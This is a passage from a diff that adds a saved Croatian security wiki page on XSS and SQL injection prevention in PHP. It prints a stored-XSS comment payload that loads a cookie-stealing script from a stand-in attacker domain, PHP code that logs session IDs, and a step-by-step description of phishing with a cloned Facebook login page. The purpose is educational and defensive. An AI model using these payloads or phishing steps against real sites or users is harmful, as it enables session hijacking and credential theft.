+</p><p><br />
+<a href="http://security.foi.hr/wiki/index.php/Datoteka:Mutillidae.JPG" class="image"><img alt="Mutillidae.JPG" src="../images/b/ba/Mutillidae.JPG" width="1476" height="809" /></a>
+</p><p><a href="http://sourceforge.net/projects/mutillidae/" class="external autonumber" rel="nofollow">[4]</a> - Mutillidae Download link
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="1.">1.</span></h3>
+<p>Prvi primjer je jednostavno umetanje JS koda u polje za unos komentara
+Prvi primjer bi mogao izgledati ovako:
+</p>
+<pre>odličan, nije se pokvario do danas!&lt;script src=“<a href="http://www.napadačevastranica.com/mojnajopakijimalicioznisftwr/kradjakukija.php" class="external free" rel="nofollow">http://www.napadačevastranica.com/mojnajopakijimalicioznisftwr/kradjakukija.php</a>&gt;&lt;/script&gt;
+</pre>
+<p>Ono Što se događa u pozadini:
+Nakon Submita komentara on se zapisuje u bazu. 
+Prilikom dolaska drugih korisnika na stranicu gdje se konentar objavio prikazuje se samo prva linija koda dok se dodatni kod izvršava. U ovom slučaju se pokreće skripta sa adrese sa napaddačevog poslužitelja(&lt;script src=“<a href="http://www.napadačevastranica.com/mojnajopakijimalicioznisftwr/kradjakukija.php" class="external free" rel="nofollow">http://www.napadačevastranica.com/mojnajopakijimalicioznisftwr/kradjakukija.php</a>&gt;&lt;/script&gt;)
+</p><p>Ukoliko se radi o korisniku koje je logiran, dakle nalazi se na stranici koja ima implementirani Login sustav, skripta koju je upravo nesvjesno pokrenuomože izgledati ovako:
+</p><p><br />
+&lt;?php
+</p><p>$fp = fopen(“cookie.txt“, “a“);
+</p><p>fwrite($fp, $_COOKIE[“PHPSESSID“].“\n“);
+</p><p>fclose($fp);
+</p><p>?&gt;
+</p><p><br />
+Događa se sljedeće:Pokreće se skripta "kradjakukija.php"koja se nalazi na napadačevom serveru tese na istom stvara .txt datoteka u koju se zapisuje identifikator sesije korisnika. Taj podatak se izvlači iz cookie-ja te ga napadač može vrlo jednostavno zapisati u svoj cookie u svom browseru. To mu omogućuje da se serveru predstavi kao legitimni korisnik te kao takav ima pristup svim njegovim podacima.
+</p>
+<h3> <span class="mw-headline" id="2.">2.</span></h3>
+<p>Drugi primjer je dosta popularan te se koristi za phishing podataka, u ovom primjeru preko Facebooka.
+</p><p>Opisat ću ga više logički kako bi se shvatila njegova jednostavnost.
+</p><p>Napadaču je potreban webserver gdje će pohraniti „fake login page“ te put do aktivnosti korisnika(najčešće Facebook aplikacija ili stranica na kojoj je objavljen link ili lažni „Like“ gumb.) Napadač kopira doslovno cijeli  kod Facebook login page-a preko View Page source u pregledniku te ga implementira u svoju skriptu. Ono što je nužno promjeniti je lokaciju gdje će se fetch-ati podaci za login, tj., promjeniti put varijable koja neide više na Facebookov server nego napadačev.
+</p><p><br />
+<a href="http://security.foi.hr/wiki/index.php/Datoteka:Fbook.jpg" class="image"><img alt="Fbook.jpg" src="../images/9/93/Fbook.jpg" width="1536" height="809" /></a>
+</p><p><br />
+Slijed napada:
+</p><p><br />
+1.	Korisnikova akcija – „like-anje“ sadržaja ili pokretanje linka
+</p><p>2.	Pred korisnikom se pojavljuje Login page koje je pokrenula napadačeva skripta
+</p><p>3.	Korisnik najčešće neznajući nesvjesno se ponovo logira misleći da se veza srušila ili sl.
+</p><p>4.	U tom se trenutku podaci zapisuju u napadačevu bazu podataka a skripta se prekida te se korisnik vraća nazat na Facebook stranicu na kojoj je bio kao da se ništa nije dogodilo.
+</p><p><br />
+</p><p><a href="http://security.foi.hr/wiki/index.php/Datoteka:Fbookphish.jpg" class="image"><img alt="Fbookphish.jpg" src="../images/5/58/Fbookphish.jpg" width="750" height="484" /></a>
+</p><p>U sumljivim situacijama treba gledati u „adress bar“ jer je razlika najčešće samo u par znakova!
+</p><p><br />
+</p>
+<hr />
+<h1> <span class="mw-headline" id="Literatura">Literatura</span></h1>
+<p>1. <a href="https://www.owasp.org/index.php/Guide_to_SQL_Injection#How_to_Avoid_SQL_Injection_Vulnerabilities" class="external free" rel="nofollow">https://www.owasp.org/index.php/Guide_to_SQL_Injection#How_to_Avoid_SQL_Injection_Vulnerabilities</a> – OWASP.org - Guide to SQL Injection 
+</p><p>2. <a href="https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection" class="external free" rel="nofollow">https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection</a> - OWASP.org - Reviewing Code for SQL Injection 
+</p><p>3. <a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OWASP-DV-005%29" class="external free" rel="nofollow">https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OWASP-DV-005%29</a> – OWASP.org - Testing for SQL Injection (OWASP-DV-005)
+</p><p>4. <a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet" class="external free" rel="nofollow">https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet</a>  - OWASP.org - SQL Injection Prevention Cheat Sheet 
+</p><p>5. <a href="http://sqlzoo.net/hack/" class="external free" rel="nofollow">http://sqlzoo.net/hack/</a> - How to exploit the SQL Injection Attack 
+</p><p>6. <a href="http://sqlmap.org/" class="external free" rel="nofollow">http://sqlmap.org/</a> - sqlmap 
+</p><p>7. <a href="https://github.com/sqlmapproject/sqlmap/wiki/Introduction" class="external free" rel="nofollow">https://github.com/sqlmapproject/sqlmap/wiki/Introduction</a> - sqlmap github 
+</p><p>8. <a href="http://www.applicure.com/blog/anatomy-of-an-sql-injection-attack" class="external free" rel="nofollow">http://www.applicure.com/blog/anatomy-of-an-sql-injection-attack</a> - The Anatomy of a SQL Injection Attack 
+</p><p>9. <a href="http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx" class="external free" rel="nofollow">http://www.mcafee.com/us/downloads/free-tools/hacme-casino.aspx</a> - Hacme Casino 
+</p><p>10. <a href="http://www.youtube.com/watch?v=rdyQoUNeXSg" class="external free" rel="nofollow">http://www.youtube.com/watch?v=rdyQoUNeXSg</a> – Advance SQL injection by Joseph McCray
+</p><p>11. <a href="http://www.hroug.hr/hr/konferencije/prethodne_konferencije/2011_u_rovinju/predavanja_radionice_demogroundi/predavanja/tehnoloske_linux_i_open_source_teme/sql_injection_napadi_i_odbrane" class="external free" rel="nofollow">http://www.hroug.hr/hr/konferencije/prethodne_konferencije/2011_u_rovinju/predavanja_radionice_demogroundi/predavanja/tehnoloske_linux_i_open_source_teme/sql_injection_napadi_i_odbrane</a> - SQL Injection: Napadi i odbrane
+</p><p>12. <a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae" class="external free" rel="nofollow">https://www.owasp.org/index.php/Category:OWASP_Mutillidae</a> - Mutillidae
+</p><p>13. <a href="http://www.dvwa.co.uk/" class="external free" rel="nofollow">http://www.dvwa.co.uk/</a> - Damn Vulnerable Web Application
+</p><p>14. Napredno PHP programiranje i izrada web aplikacija;I. Božajić, Algebra, Zagreb 2011.
+</p><p>15. <a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29" class="external free" rel="nofollow">https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29</a> - owasp o xss-u
+</p>
+<!-- 
+NewPP limit report
+Preprocessor node count: 90/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:6250-0!*!0!!hr!2!edit=0 and timestamp 20190203204113 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html">http://security.foi.hr/wiki/index.php/Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u&amp;oldid=21090" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 13:37, 12. lipnja 2013.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 11.447 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Prevencija_XSS-a_i_SQL_injectiona_u_PHP-u", "wgTitle": "Prevencija XSS-a i SQL injectiona u PHP-u", "wgAction": "view", "wgArticleId": 6250, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 21090, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.381 secs. -->			</body>
+</html>
